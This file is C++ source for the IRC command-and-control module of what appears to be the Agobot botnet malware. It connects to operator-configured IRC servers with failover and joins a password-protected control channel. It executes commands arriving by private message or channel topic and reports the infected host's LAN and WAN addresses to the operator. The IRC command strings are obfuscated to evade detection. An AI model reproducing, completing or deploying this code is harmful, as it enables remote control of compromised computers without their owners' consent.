#include "main.h"
#include "cvar.h"
#include "irc.h"
#include "mainctrl.h"
#include "utility.h"

#ifdef WIN32
	typedef int (__stdcall *IGCSE)(LPDWORD, char *, DWORD, DWORD);
	IGCSE fInternetGetConnectedStateEx;
#endif

void fillList(char *slist[], const char* cmd){*slist = (char*)malloc(strlen(cmd)+1);strcpy(*slist,cmd);}
char *ircCMD[18];

CIRC::CIRC() 
{
	// Initialize/Clear all variables
	m_bRunning			= true; 
	m_bConnected		= false; 
	m_bJoined			= false;
	m_sSocket			= INVALID_SOCKET; 
	m_iFailCount		= 0; 
	m_iServerNum		= 0;
	m_sLocalHost.Assign("");
	m_lLastRecv=GetTickCount();
	
	#ifndef AGOBOT_NO_OPENSSL
		m_csslSocket.Init(); // Initialize SSL Socket
	#endif //AGOBOT_NO_OPENSSL

	// IRC Commands
	fillList(ircCMD,    dp(42,35,40,33,0).CStr());				// PING
	fillList(ircCMD+1,  dp(40,41,46,35,29,31,0).CStr());		// NOTICE
	fillList(ircCMD+2,  dp(36,41,35,40,0).CStr());
	fillList(ircCMD+3,  dp(42,44,35,48,39,45,33,0).CStr());
	fillList(ircCMD+4,  dp(47,45,31,44,34,41,45,46,0).CStr());	// USERHOST
	fillList(ircCMD+5,  dp(71,71,70,0).CStr());
	fillList(ircCMD+6,  dp(71,68,70,0).CStr());
	fillList(ircCMD+7,  dp(42,41,40,33,0).CStr());
	fillList(ircCMD+8,  dp(42,27,45,45,0).CStr());
	fillList(ircCMD+9,  dp(40,35,29,37,0).CStr());
	fillList(ircCMD+10, dp(47,45,31,44,0).CStr());
	fillList(ircCMD+11, dp(71,73,71,0).CStr());
	fillList(ircCMD+12, dp(37,35,29,37,0).CStr());
	fillList(ircCMD+13, dp(42,27,44,46,0).CStr());
	fillList(ircCMD+14, dp(39,41,30,31,0).CStr());
	fillList(ircCMD+15, dp(68,68,69,0).CStr());
	fillList(ircCMD+16, dp(68,68,73,0).CStr());
	fillList(ircCMD+17, dp(43,47,35,46,0).CStr());
}

void *CIRC::Run() {
	CString sLine;
	#ifndef AGOBOT_NO_OPENSSL
		#ifdef DBGCONSOLE
			g_cMainCtrl.m_cConsDbg.Log(1, "Starting SSL Socket\n");
		#endif
		m_csslSocket.Init();
	#endif

	while(m_bRunning && g_cMainCtrl.m_bRunning) {
		if((m_iServerNum==0 && m_iFailCount>5) || (m_iServerNum!=0 && m_iFailCount>2)) {

			m_bJoined=false; 
			m_bConnected=false; 

			if(m_sSocket!=INVALID_SOCKET) {
				xClose(m_sSocket);
			}
			m_sSocket=INVALID_SOCKET;

			g_cMainCtrl.m_cMac.ClearLogins();
			// Select new server
			m_iServerNum++; 
			if(m_iServerNum>m_vServers.size()-1) m_iServerNum=0;
			m_iFailCount=0; // Reset the failure count
			// Set the cvars to the new values

			g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_chanpass, \
				m_vServers.at(m_iServerNum)->si_chanpass.sValue);
			g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_mainchan, \
				m_vServers.at(m_iServerNum)->si_mainchan.sValue);
			g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_nickprefix, \
				m_vServers.at(m_iServerNum)->si_nickprefix.sValue);
			g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_port, \
				m_vServers.at(m_iServerNum)->si_port.sValue);
			g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_server, \
				m_vServers.at(m_iServerNum)->si_server.sValue);
			g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_servpass, \
				m_vServers.at(m_iServerNum)->si_servpass.sValue);
			g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_usessl, \
				m_vServers.at(m_iServerNum)->si_usessl.sValue);
			m_lLastRecv=GetTickCount(); 
		}

		if(m_sSocket==INVALID_SOCKET) { // We don't have a socket yet, try to create one
			m_sSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			m_bConnected=false; Sleep(2000);
			#ifdef DBGCONSOLE
				g_cMainCtrl.m_cConsDbg.Log(1, "Socket State: %d\nConnected Value: %d\n", m_sSocket, m_bConnected);
			#endif
		} 

		else if(m_bConnected == false) 
		{ 
			/*
			if(!g_cMainCtrl.m_bIdentD_Running && g_cMainCtrl.m_cBot.identd_enabled.bValue) 
			{
				g_cMainCtrl.m_cIdentD.Start();
			}
			*/
			// Setup vars, resolve address
			sockaddr_in ssin; 
			int iErr; 
			memset(&ssin, 0, sizeof(ssin)); 
			ssin.sin_family=AF_INET;
			ssin.sin_port=htons(g_cMainCtrl.m_cBot.si_port.iValue); 
			ssin.sin_addr.s_addr=ResolveAddress(g_cMainCtrl.m_cBot.si_server.sValue.CStr());
			m_lLastRecv=GetTickCount();

			iErr=connect(m_sSocket, (sockaddr*)&ssin, sizeof(sockaddr_in));

			if(iErr==SOCKET_ERROR) 
			{
				Sleep(10000); 
				m_bConnected=false; 
				m_iFailCount++; 
				continue;
			} else {
				m_bConnected=true; 
				m_bJoined=false; 
			}

			m_lLastRecv=GetTickCount();

			#ifndef AGOBOT_NO_OPENSSL
				if(g_cMainCtrl.m_cBot.si_usessl.bValue) 
				{
					m_csslSocket.AttachToSocket(m_sSocket);
					if(!m_csslSocket.Connect()) 
					{
						xClose(m_sSocket); 
						m_sSocket=INVALID_SOCKET;
						Sleep(10000); 
						m_bConnected=false; 
						m_iFailCount++; 
						continue; 
					}
					m_lLastRecv=GetTickCount(); 
				}
			#endif

			// Get local IP address
			sockaddr sa; 
			socklen_t sas=sizeof(sa); 
			memset(&sa, 0, sizeof(sa)); 
			getsockname(m_sSocket, &sa, &sas);
			char szTemp[64]; 
			sprintf(szTemp, "%d.%d.%d.%d", (unsigned char)sa.sa_data[2], \
				(unsigned char)sa.sa_data[3], (unsigned char)sa.sa_data[4], \
				(unsigned char)sa.sa_data[5]);
			m_sLocalIp.Assign(szTemp); 
			m_lLocalAddr=inet_addr(szTemp);

			#ifdef DBGCONSOLE
				g_cMainCtrl.m_cConsDbg.Log(1, "Connected to IRC server, sending information.\n");
			#endif

			// Send server password
			if(g_cMainCtrl.m_cBot.si_servpass.sValue.Compare("")) {
				SendRawFormat("%s %s\r\n", ircCMD[8], g_cMainCtrl.m_cBot.si_servpass.sValue.CStr());
			}

			// Send the nick and register with the irc server
			SendRawFormat("%s %s\r\n%s %s 0 0 :%s\r\n",ircCMD[9], g_cMainCtrl.m_sUserName.CStr(), \
				ircCMD[10],g_cMainCtrl.m_sUserName.CStr(), g_cMainCtrl.m_sUserName.CStr());
		
			#ifdef DBGCONSOLE
				g_cMainCtrl.m_cConsDbg.Log(1, "Information sent to IRC server.\n");
			#endif
		} else {
				char szLine[8192]; 
				memset(szLine, 0, sizeof(szLine));
				// Wait for a complete line to be received
				bool bRecvd=false;

				#ifndef AGOBOT_NO_OPENSSL
					if(g_cMainCtrl.m_cBot.si_usessl.bValue)
						bRecvd=recv_line_irc(m_sSocket, szLine, sizeof(szLine), &m_csslSocket);
					else 
				#endif

				bRecvd=recv_line_irc(m_sSocket, szLine, sizeof(szLine), NULL);
				
				if(bRecvd) {

					m_lLastRecv=GetTickCount(); 
					sLine.Empty();
					sLine = szLine;

				// Set m_bJoined if we joined the channel
				if(!sLine.Token(1, " ").Compare(ircCMD[11]) && \
					!sLine.Token(4, " ").Compare(g_cMainCtrl.m_cBot.si_mainchan.sValue))
				   m_bJoined=true;
				// Ping! Pong?
				else if(!sLine.Token(0, " ").Compare(ircCMD[0])) 
				{
					SendRawFormat("%s %s\r\n",ircCMD[7], sLine.Token(1, " ").CStr());
					if(!m_bJoined) SendRawFormat("%s %s %s\r\n", ircCMD[2],\
						g_cMainCtrl.m_cBot.si_mainchan.sValue.CStr(), \
						g_cMainCtrl.m_cBot.si_chanpass.sValue.CStr()); 
				}

				else if(!sLine.Token(1, " ").Compare(ircCMD[1])) {
					if(sLine.Token(18, " ").Compare("")) {
						if(!sLine.Token(17, " ").Compare(ircCMD[7]))
							SendRawFormat("%s %s\r\n",ircCMD[7], sLine.Token(18, " ").CStr());
						if(!m_bJoined) SendRawFormat("%s %s %s\r\n",ircCMD[2], \
							g_cMainCtrl.m_cBot.si_mainchan.sValue.CStr(), \
							g_cMainCtrl.m_cBot.si_chanpass.sValue.CStr()); } }

				// Connected to the server, get the hostname
				else if(!sLine.Token(1, " ").Compare(ircCMD[15]) || !sLine.Token(1, " ").Compare(ircCMD[16])) {
					if(!m_bJoined) {
						SendRawFormat("%s %s %s\r\n",ircCMD[2], \
						g_cMainCtrl.m_cBot.si_mainchan.sValue.CStr(), \
						g_cMainCtrl.m_cBot.si_chanpass.sValue.CStr());
					}
					SendRawFormat("%s %s\r\n",ircCMD[4], g_cMainCtrl.m_sUserName.CStr()); }
				
				// Get the hostname
				else if(!sLine.Token(1, " ").Compare(ircCMD[6])) {
					CString sTemp=sLine.Token(3, " ");
					char *h=strstr(sTemp.Str(), "@");
					if(h) m_sLocalHost.Assign(h+1); }

				// Its a topic, check for topic command
				else if(!sLine.Token(1, " ").Compare(ircCMD[5]) && \
					g_cMainCtrl.m_cBot.bot_topiccmd.bValue) {
					CString sTopic=sLine.Token(1, ":");
					CMessage *msg=new CMessage; 
					CCmdExecutor *ex=new CCmdExecutor;
						sTopic.Append("|");
						for(int i = 0; sTopic.Token(i, "|").Compare(""); i++)
						{
							CMessage *msg=new CMessage; CCmdExecutor *ex=new CCmdExecutor;
							// Check silent and notice parameters, and set bool flags accordingly
							if(sLine.Find(" -s")) msg->bSilent=true; else msg->bSilent=false;
							if(sLine.Find(" -n")) msg->bNotice=true; else msg->bNotice=false;
							if(sLine.Find(" -o")) msg->bOutchan=true; else msg->bOutchan=false;

							msg->sSrc.Assign(sLine.Token(3, " ")); 
							msg->sIdentd.Assign("");
							msg->sHost.Assign(""); 
							msg->sDest.Assign(sLine.Token(3," "));
							msg->sChatString.Assign(sTopic.Token(i, "|").CStr());

							// Let the bot handle it internally
							ex->Set(msg, true); delete msg;
							ex->Start();
						}
				}

				// Its a private message
				else if(!sLine.Token(1, " ").Compare(ircCMD[3])) {
					CMessage *msg=new CMessage; CCmdExecutor *ex=new CCmdExecutor;
					// Check silent and notice parameters, and set bool flags accordingly
					if(sLine.Find(" -o")) msg->bOutchan=true; else msg->bOutchan=false;
					if(sLine.Find(" -s")) msg->bSilent=true; else msg->bSilent=false;
					if(sLine.Find(" -n")) msg->bNotice=true; else msg->bNotice=false;
					// Parse the strings, and insert them into the message
					msg->sSrc.Assign(sLine.Token(0, ":").Token(0, " ").Token(0, "!"));
					msg->sIdentd.Assign(sLine.Token(1, "!").Token(0, "@"));
					msg->sHost.Assign(sLine.Token(1, "@").Token(0, " "));
					msg->sDest.Assign(sLine.Token(2, " "));
					char *szText=strstr(sLine.Str(), " :");
					if(szText) msg->sChatString.Assign(szText+2); else msg->sChatString.Assign("");
#ifdef DBGCONSOLE
					g_cMainCtrl.m_cConsDbg.Log(1, "CIRC(0x%8.8Xh): %s / %s / %s / %s / \"%s\"...\n", \
						this, msg->sSrc.CStr(), msg->sIdentd.CStr(), msg->sHost.CStr(), \
						msg->sDest.CStr(), msg->sChatString.CStr());
#endif
					// Let the bot handle it
					ex->Set(msg); delete msg;
					ex->Start();
				}

				// Someone got kicked, maybe the bot itself
				else if(!sLine.Token(1, " ").Compare(ircCMD[12])) 
				{
					login *pLogin=g_cMainCtrl.m_cMac.FindLogin(sLine.Token(3, " "));
					if(pLogin) g_cMainCtrl.m_cMac.DelLogin(sLine.Token(3, " "), sLine.Token(3, " "));
					if(!sLine.Token(3, " ").Compare(g_cMainCtrl.m_sUserName)) 
					{
						CString sName(sLine.Token(0, ":").Token(0, "!").CStr());
						m_bJoined=false; 
						SendRawFormat("%s %s %s\r\n",ircCMD[2], \
						g_cMainCtrl.m_cBot.si_mainchan.sValue.CStr(), \
						g_cMainCtrl.m_cBot.si_chanpass.sValue.CStr());
					} 
				}

				// Someone changed his nickname
				else if(!sLine.Token(1, " ").Compare(ircCMD[9])) {
					// Check if hes logged in, if so, replace the username in CMac
					CString sOldNick(sLine.Token(1, ":").Token(0, "!").CStr());
					if(!strstr(sLine.Str(), " :")) continue;
					CString sNewNick(strstr(sLine.Str(), " :"));
					if(sOldNick.Compare("") && sNewNick.Compare("")) {
						login *pLogin=g_cMainCtrl.m_cMac.FindLogin(sOldNick);
						if(pLogin) pLogin->sIRCUsername.Assign(sNewNick);
						if(!sOldNick.Compare(g_cMainCtrl.m_sUserName)) g_cMainCtrl.m_sUserName.Assign(sNewNick); } }

				// Someone left the channel
				else if(!sLine.Token(1, " ").Compare(ircCMD[13]) || !sLine.Token(1, " ").Compare(ircCMD[17])) {
					// Check if hes logged in, if so, log him out
					login *pLogin=g_cMainCtrl.m_cMac.FindLogin(sLine.Token(1, ":").Token(0, "!"));
					if(pLogin) g_cMainCtrl.m_cMac.DelLogin(sLine.Token(1, ":").Token(0, "!"), sLine.Token(1, ":").Token(0, "!")); }
			
				} else { // We didn't receive a valid line, or the server closed the connection
			#ifdef DBGCONSOLE
				g_cMainCtrl.m_cConsDbg.Log(1, "OMGOMGOMGOMGOMGOMGOMGOMGOMGOGMOGMOGM\n");
			#endif
					Fail(); 
				continue;
			}
		}
	}

	return NULL;
}



//CString *lb(const char one,...) = dp(const char one,...);

void CIRC::Init()
{
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdRaw,			dp(9,79,18,1,23,0).CStr(),					this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdReconnect,	dp(9,79,18,5,3,15,14,14,5,3,20,0).CStr(),	this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdPart,			dp(9,79,16,1,18,20,0).CStr(),				this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdMode,			dp(9,79,13,15,4,5,0).CStr(),				this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdPrivMsg,		dp(9,79,13,19,7,0).CStr(),					this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdNotice,		dp(9,79,14,15,20,9,3,5,0).CStr(),			this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdDisconnect,	dp(9,79,4,9,19,3,15,14,14,5,3,20,0).CStr(),	this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdGetHost,		dp(9,79,7,5,20,8,15,19,20,0).CStr(),		this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdNetInfo,		dp(9,79,14,5,20,9,14,6,15,0).CStr(),		this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdJoin,			dp(9,79,10,15,9,14,0).CStr(),				this);
}

bool CIRC::HandleCommand(CMessage *pMsg)
{
	if(!pMsg->sCmd.Compare(m_cmdDisconnect.sName.CStr()) || !pMsg->sCmd.Compare(m_cmdReconnect.sName.CStr())){	
	m_iServerNum=0; m_iFailCount=0;
	m_bJoined=false; m_bConnected=false; xClose(m_sSocket);
	m_sSocket=INVALID_SOCKET; g_cMainCtrl.m_cMac.ClearLogins(); }

	else if(!pMsg->sCmd.Compare(m_cmdNotice.sName.CStr())){		
	SendRawFormat("%s %s :%s\r\n",ircCMD[1], pMsg->sChatString.Token(1, " ").CStr(), pMsg->sChatString.Token(2, " ").CStr());
	}

	else if(!pMsg->sCmd.Compare(m_cmdNetInfo.sName.CStr()))
	{	SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "%s", NetInfo().CStr()); }

	else if(!pMsg->sCmd.Compare(m_cmdGetHost.sName.CStr()))
	{	if(m_sLocalHost.Find(pMsg->sChatString.Token(1, " ")))
			SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "%s", NetInfo().CStr()); }

	else if(!pMsg->sCmd.Compare(m_cmdJoin.sName.CStr()))
	{	SendRawFormat("%s %s %s\r\n",ircCMD[2], pMsg->sChatString.Token(1, " ").CStr(), pMsg->sChatString.Token(2, " ").CStr()); }

	else if(!pMsg->sCmd.Compare(m_cmdPart.sName.CStr()))
	{	SendRawFormat("%s %s\r\n",ircCMD[13] ,pMsg->sChatString.Token(1, " ").CStr()); }

	else if(!pMsg->sCmd.Compare(m_cmdRaw.sName.CStr()))	{	SendRawFormat("%s\r\n",pMsg->sChatString.Mid(9).CStr());  }

	else if(!pMsg->sCmd.Compare(m_cmdPrivMsg.sName.CStr()))
	{	SendMsg(false, false, pMsg->sChatString.Token(2, " ", true).Str(), pMsg->sChatString.Token(1, " ").Str()); }

	else if(!pMsg->sCmd.Compare(m_cmdMode.sName.CStr()))
	{	SendRawFormat("%s %s %s %s\r\n",ircCMD[14], pMsg->sChatString.Token(1, " ").CStr(), pMsg->sChatString.Token(2, " ").CStr(), pMsg->sChatString.Token(3, " ").CStr()); }

	return false;
}


CString CIRC::NetInfo()
{	CString sNetInfo; sockaddr sa; socklen_t sas;
	// get ip address
	sas=sizeof(sa); memset(&sa, 0, sizeof(sa)); getsockname(m_sSocket, &sa, &sas);
	char cname[128];
	char szIP[16]; sprintf(szIP, "%d.%d.%d.%d",
		(unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
		(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);

	sNetInfo.Assign(""); 
	sNetInfo.Append("lan: "); sNetInfo.Append(szIP); sNetInfo.Append(". ");
	if (m_sLocalHost.CStr!=NULL)
	sNetInfo.Append("wan: "); sNetInfo.Append(m_sLocalHost); sNetInfo.Append(". ");

/*	if(g_cMainCtrl.m_cSpeedTest.m_bDataSet)
	{
		CString sTempBuf; 
		sTempBuf.Format("Speed: EU(%d kbit/s) US(%d kbit/s) ASIA(%d kbit/s) Total(%d kbit/s) ",
		g_cMainCtrl.m_cSpeedTest.m_speedData.lEUSpeed, g_cMainCtrl.m_cSpeedTest.m_speedData.lUSSpeed, 
		g_cMainCtrl.m_cSpeedTest.m_speedData.lASIASpeed, g_cMainCtrl.m_cSpeedTest.m_speedData.lTotalSpeed);
		sNetInfo.Append(sTempBuf);
	}
*/
	if(IsPrivate(szIP))
		sNetInfo.Append("[PRIVATE]");
	else
		sNetInfo.Append("[PUBLIC]");

	return sNetInfo; }

bool CIRC::SendRaw(char *szMsg)
{
#ifndef AGOBOT_NO_OPENSSL
	if(g_cMainCtrl.m_cBot.si_usessl.bValue)
	{	if(m_csslSocket.Write(szMsg, strlen(szMsg))<strlen(szMsg))
		{	m_bJoined=false; m_bConnected=false; xClose(m_sSocket);
			m_sSocket=INVALID_SOCKET; g_cMainCtrl.m_cMac.ClearLogins(); return false; }
		else return true; }
	else
	{
#endif // AGOBOT_NO_OPENSSL
		if(xWrite(m_sSocket, szMsg, strlen(szMsg))<strlen(szMsg))
		{	m_bJoined=false; m_bConnected=false; xClose(m_sSocket);
			m_sSocket=INVALID_SOCKET; g_cMainCtrl.m_cMac.ClearLogins(); return false; }
		else return true;
#ifndef AGOBOT_NO_OPENSSL
	}
#endif // AGOBOT_NO_OPENSSL
}

bool CIRC::SendRawFormat(const char *szFmt, ...)
{	va_list va_alist; char formatbuf[8192]; va_start(va_alist, szFmt);
	vsnprintf(formatbuf, sizeof(formatbuf), szFmt, va_alist); va_end(va_alist);
	return SendRaw(formatbuf); }

bool CIRC::SendMsg(bool bSilent, bool bNotice, char *szMsg, char *szDst)
{	if(bSilent) return false; CString sTheCmd; if(bNotice) sTheCmd.Assign(ircCMD[1]); else sTheCmd.Assign(ircCMD[3]);
	CString sSendBuf; sSendBuf.Format("%s %s :%s\r\n", sTheCmd.CStr(), szDst, szMsg);
	return SendRaw(sSendBuf.Str()); }
bool CIRC::SendFormat(bool bSilent, bool bNotice, char *szDst, const char *szFmt, ...)
{	va_list va_alist; char formatbuf[8192]; va_start(va_alist, szFmt);
	vsnprintf(formatbuf, sizeof(formatbuf), szFmt, va_alist); va_end(va_alist);
	return SendMsg(bSilent, bNotice, formatbuf, szDst); }

void CIRC::Fail()
{	
	Disconnect(); 
	m_iFailCount++; 
}

void CIRC::Disconnect()
{	m_bJoined=false; m_bConnected=false; xClose(m_sSocket);
	m_sSocket=INVALID_SOCKET; g_cMainCtrl.m_cMac.ClearLogins(); }
